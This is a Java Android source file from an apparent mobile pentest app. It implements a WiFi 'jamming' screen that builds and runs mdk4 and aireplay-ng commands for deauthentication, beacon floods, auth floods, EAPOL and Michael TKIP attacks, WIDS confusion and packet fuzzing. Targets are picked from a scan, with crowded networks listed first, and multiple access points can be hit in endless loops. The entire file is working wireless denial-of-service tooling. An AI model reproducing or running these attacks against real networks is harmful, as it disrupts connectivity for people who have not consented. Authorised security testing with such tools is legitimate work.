package com.zalexdev.stryker.wifi;

import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.text.InputType;
import android.text.method.ScrollingMovementMethod;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.Core;

import java.util.ArrayList;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Dedicated WiFi jamming / RF attack hub (mdk4 modes).
 * Mass deauth FAB also uses {@link #launchMdk4}.
 */
public class WifiJamFragment extends Fragment {

    public static final class Mode {
        public final String flag;
        public final String title;
        public final String subtitle;
        /** Require a target from scan / manual entry before launch. */
        public final boolean needsTarget;
        /** How the picked AP is applied to the command. */
        public final TargetKind targetKind;

        Mode(String flag, String title, String subtitle, boolean needsTarget, TargetKind kind) {
            this.flag = flag;
            this.title = title;
            this.subtitle = subtitle;
            this.needsTarget = needsTarget;
            this.targetKind = kind;
        }
    }

    public enum TargetKind {
        NONE,
        BSSID,       // -B / -a / -t / -A depending on mode
        SSID,        // -e / -n / -E
        BSSID_OR_SSID,
        FUZZER       // needs -s sources -m modifiers
    }

    public static final Mode[] MODES = {
            new Mode("d", "Deauth / Disassoc",
                    "Disconnect clients (-B BSSID). Channel locked on iface.", false, TargetKind.BSSID),
            new Mode("b", "Beacon flood",
                    "Fake APs (-n SSID, -c chan, -m OUI). Do NOT use -t as BSSID.", false, TargetKind.SSID),
            new Mode("a", "Auth DoS",
                    "Auth flood (-a AP). Optional intelligent -i.", false, TargetKind.BSSID),
            new Mode("p", "SSID probe / bruteforce",
                    "Probe AP (-e SSID / -t BSSID). Not a packet flood.", true, TargetKind.BSSID_OR_SSID),
            new Mode("m", "Michael TKIP",
                    "TKIP countermeasures — requires -t BSSID", true, TargetKind.BSSID),
            new Mode("e", "EAPOL Start / Logoff",
                    "Flood EAPOL Start or Logoff (-t BSSID)", true, TargetKind.BSSID),
            new Mode("w", "WIDS Confusion",
                    "Abuse WIDS/WDS — requires -e SSID", true, TargetKind.SSID),
            new Mode("s", "Mesh 802.11s",
                    "Mesh route/neighbor attacks (advanced)", false, TargetKind.NONE),
            new Mode("f", "Packet Fuzzer",
                    "Needs sources (-s) and modifiers (-m)", true, TargetKind.FUZZER),
            new Mode("x", "PoC Testing",
                    "Protocol PoC tests (optional -A AP MAC)", false, TargetKind.BSSID),
    };

    /** Prevents a previous Stop from disabling monitor while a new attack starts. */
    private static final AtomicLong SESSION = new AtomicLong(0);

    private Core core;
    private Activity activity;
    private Context context;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_wifi_jam, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        context = requireContext();
        activity = requireActivity();
        core = new Core(context);

        LinearLayout list = view.findViewById(R.id.jam_modes);
        LayoutInflater inflater = LayoutInflater.from(context);
        for (Mode mode : MODES) {
            View row = inflater.inflate(R.layout.item_wifi_jam_mode, list, false);
            TextView title = row.findViewById(R.id.jam_mode_title);
            TextView sub = row.findViewById(R.id.jam_mode_sub);
            title.setText(mode.title);
            sub.setText(mode.subtitle);
            row.setOnClickListener(v -> startMode(mode));
            list.addView(row);
        }
    }

    private void startMode(Mode mode) {
        if (mode.targetKind == TargetKind.FUZZER) {
            promptFuzzer(mode);
            return;
        }
        if (mode.targetKind == TargetKind.NONE) {
            if ("s".equals(mode.flag)) {
                // Mesh: basic path-request flood defaults
                launchMdk4(activity, context, core, mode.flag, mode.title,
                        null, null, -1, " -p 00:11:22:33:44:55 -s 100");
            } else {
                launchMdk4(activity, context, core, mode.flag, mode.title, null, null, -1, null);
            }
            return;
        }
        if (mode.needsTarget
                || mode.targetKind == TargetKind.SSID
                || mode.targetKind == TargetKind.BSSID
                || mode.targetKind == TargetKind.BSSID_OR_SSID) {
            MaterialAlertDialogBuilder b = new MaterialAlertDialogBuilder(context)
                    .setTitle(mode.title)
                    .setMessage(mode.needsTarget
                            ? "Pick a target from your last WiFi scan (required for this mode)."
                            : "Target a specific AP from your last WiFi scan?")
                    .setPositiveButton("Pick from scan", (d, w) -> pickTargetFromScan(mode, mode.needsTarget))
                    .setNegativeButton(android.R.string.cancel, null);
            if (!mode.needsTarget) {
                b.setNeutralButton("No target / defaults", (d, w) ->
                        launchMdk4(activity, context, core, mode.flag, mode.title,
                                null, null, -1, null));
            }
            b.show();
        }
    }

    private void promptFuzzer(Mode mode) {
        CharSequence[] presets = new CharSequence[]{
                "Beacons + shotgun (b + s)",
                "Air sniff + shotgun (a + s)",
                "CTS flood (c + n)",
                "Probe + broken tags (p + t)"
        };
        String[] extras = new String[]{
                " -s b -m s -p 200",
                " -s a -m s -p 200",
                " -s c -m n -p 250",
                " -s p -m t -p 200"
        };
        new MaterialAlertDialogBuilder(context)
                .setTitle(mode.title)
                .setItems(presets, (d, which) ->
                        launchMdk4(activity, context, core, mode.flag, mode.title,
                                null, null, -1, extras[which]))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    /** Prefer in-memory scan from MainActivity, else persisted last scan. */
    private ArrayList<WiFINetwork> loadScanNetworks() {
        ArrayList<WiFINetwork> nets = null;
        if (activity instanceof MainActivity) {
            nets = ((MainActivity) activity).getNetworks();
        }
        if (nets == null || nets.isEmpty()) {
            nets = core.getLastWifiScan();
        }
        return nets != null ? nets : new ArrayList<>();
    }

    private void pickTargetFromScan(Mode mode, boolean required) {
        ArrayList<WiFINetwork> nets = loadScanNetworks();
        // Prefer networks with most clients first
        java.util.Collections.sort(nets, (a, b) -> {
            int c = Integer.compare(b.getClientCount(), a.getClientCount());
            if (c != 0) return c;
            return Integer.compare(a.getPower(), b.getPower());
        });
        if (nets.isEmpty()) {
            new MaterialAlertDialogBuilder(context)
                    .setTitle(mode.title)
                    .setMessage("No WiFi scan data yet. Use Monitor + clients scan first, or enter manually.")
                    .setPositiveButton("Enter manually", (d, w) -> promptManual(mode, required))
                    .setNegativeButton(android.R.string.cancel, null)
                    .show();
            return;
        }

        CharSequence[] labels = new CharSequence[nets.size()];
        boolean[] checked = new boolean[nets.size()];
        for (int i = 0; i < nets.size(); i++) {
            WiFINetwork n = nets.get(i);
            String ssid = n.getSsid() == null || n.getSsid().isEmpty() ? "<hidden>" : n.getSsid();
            int cc = n.getClientCount();
            labels[i] = ssid + "\n" + n.getMac() + "  ·  ch " + n.getChannel()
                    + "  ·  " + n.getPower() + " dBm"
                    + (cc > 0 ? "  ·  " + cc + " clients" : "");
        }

        new MaterialAlertDialogBuilder(context)
                .setTitle("Select target AP(s)")
                .setMultiChoiceItems(labels, checked, (d, which, isChecked) -> checked[which] = isChecked)
                .setPositiveButton("Attack selected", (d, w) -> {
                    ArrayList<WiFINetwork> selected = new ArrayList<>();
                    for (int i = 0; i < checked.length; i++) {
                        if (checked[i]) selected.add(nets.get(i));
                    }
                    if (selected.isEmpty()) {
                        if (required) {
                            core.toaster("Select at least one AP");
                            return;
                        }
                        launchMdk4(activity, context, core, mode.flag, mode.title,
                                null, null, -1, null);
                        return;
                    }
                    if (selected.size() == 1) {
                        WiFINetwork n = selected.get(0);
                        launchMdk4(activity, context, core, mode.flag, mode.title,
                                n.getMac(), n.getSsid(), n.getChannel(), null);
                    } else {
                        pickEngineThenMulti(mode, selected);
                    }
                })
                .setNeutralButton("Enter manually…", (d, w) -> promptManual(mode, required))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void pickEngineThenMulti(Mode mode, ArrayList<WiFINetwork> selected) {
        // aireplay only makes sense for deauth; other modes stay mdk4-only
        if (!"d".equals(mode.flag)) {
            pickBurstThenMulti(mode.title + " · mdk4 ×" + selected.size(), selected, true, mode.flag);
            return;
        }
        new MaterialAlertDialogBuilder(context)
                .setTitle("Attack engine · " + selected.size() + " APs")
                .setItems(new CharSequence[]{
                        "mdk4 (fast, recommended)",
                        "aireplay-ng (classic deauth)"
                }, (d, which) -> {
                    if (which == 1) {
                        pickBurstThenMulti("aireplay · ×" + selected.size(), selected, false, "d");
                    } else {
                        pickBurstThenMulti(mode.title + " · mdk4 ×" + selected.size(),
                                selected, true, mode.flag);
                    }
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    /** Ask how long each AP burst should run (persisted). */
    private void pickBurstThenMulti(String title, ArrayList<WiFINetwork> selected,
                                    boolean useMdk4, String mdkFlag) {
        java.util.Collections.sort(selected, (a, b) -> Integer.compare(a.getChannel(), b.getChannel()));
        int savedRaw = core.getInt("jam_multi_burst_sec");
        final int saved = savedRaw <= 0 ? 2 : savedRaw;
        CharSequence[] items = new CharSequence[]{
                "1 second per AP",
                "2 seconds per AP",
                "3 seconds per AP",
                "5 seconds per AP",
                "10 seconds per AP",
                "Custom…"
        };
        // Highlight last used in title
        new MaterialAlertDialogBuilder(context)
                .setTitle("Burst duration (last: " + saved + "s)")
                .setItems(items, (d, which) -> {
                    if (which == 5) {
                        final TextInputEditText edit = new TextInputEditText(context);
                        edit.setInputType(InputType.TYPE_CLASS_NUMBER);
                        edit.setHint("Seconds per AP (1–30)");
                        edit.setText(String.valueOf(saved));
                        new MaterialAlertDialogBuilder(context)
                                .setTitle("Custom burst duration")
                                .setView(edit)
                                .setPositiveButton(android.R.string.ok, (dd, ww) -> {
                                    try {
                                        int s = Integer.parseInt(String.valueOf(edit.getText()).trim());
                                        s = Math.max(1, Math.min(30, s));
                                        core.putInt("jam_multi_burst_sec", s);
                                        launchMultiSession(title, selected, useMdk4, mdkFlag, s);
                                    } catch (Exception ignored) {
                                        core.toaster("Invalid number");
                                    }
                                })
                                .setNegativeButton(android.R.string.cancel, null)
                                .show();
                        return;
                    }
                    int[] secs = {1, 2, 3, 5, 10};
                    int s = secs[which];
                    core.putInt("jam_multi_burst_sec", s);
                    launchMultiSession(title, selected, useMdk4, mdkFlag, s);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void launchMultiSession(String title, ArrayList<WiFINetwork> targets,
                                    boolean useMdk4, String mdkFlag, int burstSec) {
        if (activity == null || context == null || core == null || targets == null || targets.isEmpty()) {
            return;
        }
        final int burst = Math.max(1, Math.min(30, burstSec <= 0 ? 2 : burstSec));
        final long session = SESSION.incrementAndGet();
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_hs);
        Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);
        View outputcard = dialog.findViewById(R.id.output_card);
        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);
        MaterialButton stop = dialog.findViewById(R.id.stop);
        TextView scanText = dialog.findViewById(R.id.scan_text);
        scanText.setText(title);
        MaterialCardView info_card = dialog.findViewById(R.id.info_card);
        info_card.setVisibility(View.GONE);
        resulttext.setVisibility(View.GONE);
        outputcard.setVisibility(View.VISIBLE);
        outputtext.setMovementMethod(new ScrollingMovementMethod());
        append(outputtext, "=== Multi-target · " + targets.size() + " APs · " + burst + "s/AP ===");
        for (WiFINetwork n : targets) {
            append(outputtext, " • " + n.getSsid() + " (" + n.getMac() + ") ch" + n.getChannel()
                    + " clients=" + n.getClientCount());
        }

        final boolean[] stopped = {false};

        new Thread(() -> {
            try {
                String deauthRaw = core.getString("wlan_deauth");
                if (deauthRaw == null || deauthRaw.isEmpty()) deauthRaw = "wlan0";
                appendUi(activity, outputtext, "Enabling monitor on " + deauthRaw + "…");
                if (SESSION.get() != session) return;
                boolean ok = core.monitorManager.enableMonitorMode(deauthRaw);
                if (!ok) {
                    core.customCommand("svc wifi disable", true);
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                    ok = core.monitorManager.enableMonitorMode(deauthRaw);
                }
                if (!ok) {
                    finishUi(activity, outputtext, resulttext, stop, dialog, "Monitor failed");
                    return;
                }
                String iface = core.getDeauthInterface();
                appendUi(activity, outputtext, "Monitor up · " + iface + " · settling 1s · burst "
                        + burst + "s/AP");
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}

                int round = 0;
                while (!stopped[0] && SESSION.get() == session) {
                    round++;
                    for (WiFINetwork n : targets) {
                        if (stopped[0] || SESSION.get() != session) break;
                        String mac = n.getMac() == null ? "" : n.getMac().trim();
                        if (mac.isEmpty()) continue;
                        int ch = n.getChannel();
                        if (ch > 0) {
                            core.lockWifiChannel(iface, String.valueOf(ch));
                            try { Thread.sleep(200); } catch (InterruptedException ignored) {}
                        }
                        String cmd;
                        if (useMdk4) {
                            String f = (mdkFlag == null || mdkFlag.isEmpty()) ? "d" : mdkFlag.toLowerCase(Locale.US);
                            String ssid = n.getSsid();
                            if (ssid != null) {
                                ssid = ssid.replace("\"", "").replace("'", "").replace(";", "")
                                        .replace("|", "").replace("&", "").replace("`", "").trim();
                                if (ssid.isEmpty() || "<hidden>".equalsIgnoreCase(ssid)) ssid = null;
                            }
                            String base = buildMdk4Command(iface, f, mac, ssid, ch, null);
                            cmd = "timeout " + burst + " " + base
                                    + " 2>&1 || ( " + base
                                    + " >/dev/null 2>&1 & sleep " + burst
                                    + "; killall mdk4 2>/dev/null; true )";
                        } else {
                            cmd = "timeout " + burst + " aireplay-ng --ignore-negative-one -0 0 -a " + mac
                                    + " " + iface + " 2>&1 || ("
                                    + "aireplay-ng --ignore-negative-one -0 64 -a " + mac + " " + iface
                                    + " >/dev/null 2>&1 & sleep " + burst
                                    + "; killall aireplay-ng 2>/dev/null; true)";
                        }
                        appendUi(activity, outputtext, "[r" + round + "] " + n.getSsid()
                                + " ch" + ch + " · " + burst + "s → "
                                + (useMdk4 ? "mdk4" : "aireplay"));
                        ArrayList<String> out = core.customChrootCommand(cmd);
                        int shown = 0;
                        for (String line : out) {
                            if (line == null) continue;
                            String t = line.trim();
                            if (t.isEmpty()) continue;
                            if (t.contains("Waiting for beacon") || t.contains("No such device")) {
                                appendUi(activity, outputtext, "  ! " + t);
                            } else if (shown < 4 && (t.contains("packets") || t.contains("DeAuth")
                                    || t.contains("Sending") || t.contains("mdk4"))) {
                                appendUi(activity, outputtext, "  " + t);
                                shown++;
                            }
                        }
                    }
                    appendUi(activity, outputtext, "--- round " + round + " done · looping ---");
                    try { Thread.sleep(300); } catch (InterruptedException ignored) {}
                }
            } catch (Exception e) {
                appendUi(activity, outputtext, "Error: " + e.getMessage());
            } finally {
                try { core.killWifiAttackTools(); } catch (Exception ignored) {}
                activity.runOnUiThread(() -> {
                    if (!stopped[0]) {
                        resulttext.setVisibility(View.VISIBLE);
                        resulttext.setText("Attack finished / stopped");
                        stop.setVisibility(View.GONE);
                        dialog.setCancelable(true);
                    }
                });
            }
        }, "multi-jam").start();

        stop.setOnClickListener(v -> {
            stopped[0] = true;
            SESSION.incrementAndGet();
            new Thread(() -> {
                try {
                    core.killWifiAttackTools();
                    core.monitorManager.disableMonitorMode(core.getDeauthInterface());
                } catch (Exception ignored) {
                }
            }).start();
            append(outputtext, "Stopping…");
            stop.setVisibility(View.GONE);
            dialog.setCancelable(true);
            resulttext.setVisibility(View.VISIBLE);
            resulttext.setText("Attack stopped");
        });
        dialog.show();
    }

    private void promptManual(Mode mode, boolean required) {
        boolean wantSsid = mode.targetKind == TargetKind.SSID
                || mode.targetKind == TargetKind.BSSID_OR_SSID;
        TextInputLayout til = new TextInputLayout(context);
        til.setHint(wantSsid && mode.targetKind == TargetKind.SSID
                ? "SSID"
                : "BSSID (aa:bb:cc:dd:ee:ff) or SSID");
        TextInputEditText edit = new TextInputEditText(til.getContext());
        edit.setInputType(InputType.TYPE_CLASS_TEXT);
        edit.setSingleLine(true);
        til.addView(edit);
        int pad = (int) (20 * context.getResources().getDisplayMetrics().density);
        til.setPadding(pad, pad / 2, pad, 0);

        new MaterialAlertDialogBuilder(context)
                .setTitle(mode.title)
                .setView(til)
                .setPositiveButton(android.R.string.ok, (d, w) -> {
                    String val = edit.getText() != null ? edit.getText().toString().trim() : "";
                    if (required && val.isEmpty()) {
                        core.toaster("Target required for " + mode.title);
                        return;
                    }
                    String bssid = null;
                    String ssid = null;
                    if (looksLikeMac(val)) bssid = val;
                    else ssid = val;
                    if (mode.targetKind == TargetKind.BSSID && bssid == null && required) {
                        core.toaster("Valid BSSID required");
                        return;
                    }
                    if (mode.targetKind == TargetKind.SSID && (ssid == null || ssid.isEmpty()) && required) {
                        core.toaster("SSID required");
                        return;
                    }
                    launchMdk4(activity, context, core, mode.flag, mode.title,
                            bssid, ssid, -1, null);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private static boolean looksLikeMac(String s) {
        return s != null && s.matches("(?i)([0-9a-f]{2}:){5}[0-9a-f]{2}");
    }

    /** Shared launcher used by this screen and WiFi mass-deauth FAB. */
    public static void launchMdk4(Activity activity, Context context, Core core,
                                  String modeFlag, String title) {
        launchMdk4(activity, context, core, modeFlag, title, null, null, -1, null);
    }

    public static void launchMdk4(Activity activity, Context context, Core core,
                                  String modeFlag, String title, @Nullable String bssid) {
        launchMdk4(activity, context, core, modeFlag, title, bssid, null, -1, null);
    }

    public static void launchMdk4(Activity activity, Context context, Core core,
                                  String modeFlag, String title, @Nullable String bssid,
                                  int channel) {
        launchMdk4(activity, context, core, modeFlag, title, bssid, null, channel, null);
    }

    public static void launchMdk4(Activity activity, Context context, Core core,
                                  String modeFlag, String title,
                                  @Nullable String bssid, @Nullable String ssid,
                                  int channel, @Nullable String extraFlags) {
        if (activity == null || context == null || core == null) return;

        final long session = SESSION.incrementAndGet();
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_hs);
        Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);

        View outputcard = dialog.findViewById(R.id.output_card);
        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);
        MaterialButton stop = dialog.findViewById(R.id.stop);
        TextView scanText = dialog.findViewById(R.id.scan_text);
        scanText.setText(title != null ? title : "mdk4");
        MaterialCardView info_card = dialog.findViewById(R.id.info_card);
        info_card.setVisibility(View.GONE);
        resulttext.setVisibility(View.GONE);
        outputcard.setVisibility(View.VISIBLE);
        outputtext.setMovementMethod(new ScrollingMovementMethod());

        String flag = (modeFlag == null || modeFlag.isEmpty()) ? "d" : modeFlag;
        append(outputtext, "=== mdk4 · mode '" + flag + "' ===");
        if (bssid != null) append(outputtext, "Target BSSID: " + bssid);
        if (ssid != null) append(outputtext, "Target SSID: " + ssid);
        if (channel > 0) append(outputtext, "Channel: " + channel);

        final AdvancedProcess[] proc = {null};
        final boolean[] stopped = {false};

        new Thread(() -> {
            try {
                String deauthRaw = core.getString("wlan_deauth");
                if (deauthRaw == null || deauthRaw.isEmpty()) {
                    deauthRaw = "wlan0";
                }
                appendUi(activity, outputtext, "Enabling monitor on " + deauthRaw + "…");

                if (SESSION.get() != session) return;

                boolean ok;
                if (channel > 0) {
                    ok = core.monitorManager.enableMonitorMode(deauthRaw, String.valueOf(channel));
                } else {
                    ok = core.monitorManager.enableMonitorMode(deauthRaw);
                }
                if (!ok) {
                    core.customCommand("svc wifi disable", true);
                    try { Thread.sleep(800); } catch (InterruptedException ignored) {}
                    ok = channel > 0
                            ? core.monitorManager.enableMonitorMode(deauthRaw, String.valueOf(channel))
                            : core.monitorManager.enableMonitorMode(deauthRaw);
                }
                if (SESSION.get() != session) return;

                if (!ok) {
                    finishUi(activity, outputtext, resulttext, stop, dialog,
                            "Failed to enable monitor mode on " + deauthRaw);
                    return;
                }

                String deauthIface = core.getDeauthInterface();
                appendUi(activity, outputtext, "Monitor up · iface=" + deauthIface);
                if (channel > 0) {
                    core.lockWifiChannel(deauthIface, String.valueOf(channel));
                }
                appendUi(activity, outputtext, "Settling interface (1.5s)…");
                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                if (SESSION.get() != session) return;

                if (!core.monitorManager.isMonitorModeEnabled(deauthIface)
                        && !core.monitorManager.isMonitorModeEnabled(deauthRaw)) {
                    finishUi(activity, outputtext, resulttext, stop, dialog,
                            "Interface is not in monitor mode — cannot start mdk4");
                    return;
                }

                String mdkCmd = buildMdk4Command(deauthIface, flag, bssid, ssid, channel, extraFlags);
                appendUi(activity, outputtext, "$ " + mdkCmd);

                proc[0] = new AdvancedProcess(activity, context, mdkCmd, true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        if (stopped[0] || SESSION.get() != session) return;
                        appendUi(activity, outputtext, "[mdk4] process exited");
                        activity.runOnUiThread(() -> {
                            resulttext.setVisibility(View.VISIBLE);
                            resulttext.setText("Attack finished / stopped");
                            stop.setVisibility(View.GONE);
                            dialog.setCancelable(true);
                        });
                    }

                    @Override
                    public void onNewLine(String line) {
                        if (line == null || line.trim().isEmpty()) return;
                        if (SESSION.get() != session) return;
                        String out = line.trim();
                        if (core.getBoolean("hide")) {
                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})", Pattern.CASE_INSENSITIVE)
                                    .matcher(out);
                            out = m.replaceAll(Core.HIDDEN_MAC);
                        }
                        appendUi(activity, outputtext, out);
                    }

                    @Override
                    public void onEvent(String line) {
                    }
                };
            } catch (Exception e) {
                appendUi(activity, outputtext, "Error: " + e.getMessage());
                finishUi(activity, outputtext, resulttext, stop, dialog, "Attack failed");
            }
        }, "mdk4-launch").start();

        stop.setOnClickListener(v -> {
            stopped[0] = true;
            SESSION.incrementAndGet();
            if (proc[0] != null) proc[0].kill();
            // Also kill orphaned mdk4
            new Thread(() -> {
                try {
                    core.customChrootCommand("killall mdk4 2>/dev/null; pkill -f mdk4 2>/dev/null; true");
                    core.monitorManager.disableMonitorMode(core.getDeauthInterface());
                } catch (Exception ignored) {
                }
            }, "mdk4-stop").start();
            append(outputtext, "Stopping…");
            stop.setVisibility(View.GONE);
            dialog.setCancelable(true);
            resulttext.setVisibility(View.VISIBLE);
            resulttext.setText("Attack stopped");
        });
        dialog.show();
    }

    /**
     * Build mdk4 argv matching real mode options from {@code mdk4 --help <mode>}.
     * Channel is applied via monitor lock; only modes that accept {@code -c} get it in-argv.
     */
    static String buildMdk4Command(String iface, String flag,
                                   @Nullable String bssid, @Nullable String ssid,
                                   int channel, @Nullable String extraFlags) {
        String f = flag == null ? "d" : flag.toLowerCase(Locale.US);
        StringBuilder sb = new StringBuilder("mdk4 ").append(iface).append(' ').append(f);
        String b = bssid != null ? bssid.trim() : null;
        String s = ssid != null ? ssid.trim() : null;
        if (s != null && s.isEmpty()) s = null;

        switch (f) {
                case "d": // Deauth — -B BSSID, -E ESSID. -c is hop list, not single channel.
                if (b != null && !b.isEmpty()) sb.append(" -B ").append(b);
                if (s != null) sb.append(" -E \"").append(s.replace("\"", "")).append('"');
                sb.append(" -s 200");
                break;
            case "b": // Beacon — -n SSID, -c chan, -m OUI. NEVER -t as BSSID (-t = adhoc type).
                if (s != null) sb.append(" -n \"").append(s.replace("\"", "")).append('"');
                if (channel > 0) sb.append(" -c ").append(channel).append(" -h");
                sb.append(" -m -s 50");
                break;
            case "a": // Auth DoS — -a AP (no -c in help)
                if (b != null && !b.isEmpty()) sb.append(" -a ").append(b);
                sb.append(" -m -s 200");
                break;
            case "p": // Probe / bruteforce — -e SSID, -t BSSID (no -c)
                if (s != null) sb.append(" -e \"").append(s.replace("\"", "")).append('"');
                if (b != null && !b.isEmpty()) sb.append(" -t ").append(b);
                sb.append(" -s 400");
                break;
            case "m": // Michael — -t BSSID required (no -c)
                if (b != null && !b.isEmpty()) sb.append(" -t ").append(b);
                sb.append(" -j -s 400");
                break;
            case "e": // EAPOL — -t BSSID
                if (b != null && !b.isEmpty()) sb.append(" -t ").append(b);
                sb.append(" -s 400");
                break;
            case "w": // WIDS — -e SSID required; -c is hop list
                if (s != null) sb.append(" -e \"").append(s.replace("\"", "")).append('"');
                sb.append(" -s 100");
                break;
            case "s": // Mesh — defaults via extraFlags usually
                sb.append(" -s 100");
                break;
            case "f": // Fuzzer — sources/modifiers via extraFlags
                break;
            case "x": // PoC
                if (b != null && !b.isEmpty()) sb.append(" -A ").append(b);
                sb.append(" -s 100");
                break;
            default:
                if (b != null && !b.isEmpty()) sb.append(" -t ").append(b);
                break;
        }
        if (extraFlags != null && !extraFlags.trim().isEmpty()) {
            sb.append(' ').append(extraFlags.trim());
        }
        return sb.toString();
    }

    private static void append(TextView tv, String line) {
        if (tv == null || line == null) return;
        tv.append(line);
        if (!line.endsWith("\n")) tv.append("\n");
        if (tv.getLayout() != null) {
            int scroll = tv.getLayout().getLineTop(tv.getLineCount()) - tv.getHeight();
            tv.scrollTo(0, Math.max(scroll, 0));
        }
    }

    private static void appendUi(Activity activity, TextView tv, String line) {
        if (activity == null) return;
        activity.runOnUiThread(() -> append(tv, line));
    }

    private static void finishUi(Activity activity, TextView outputtext, TextView resulttext,
                                 MaterialButton stop, Dialog dialog, String msg) {
        if (activity == null) return;
        activity.runOnUiThread(() -> {
            append(outputtext, msg);
            resulttext.setVisibility(View.VISIBLE);
            resulttext.setText(msg);
            stop.setVisibility(View.GONE);
            dialog.setCancelable(true);
        });
    }
}
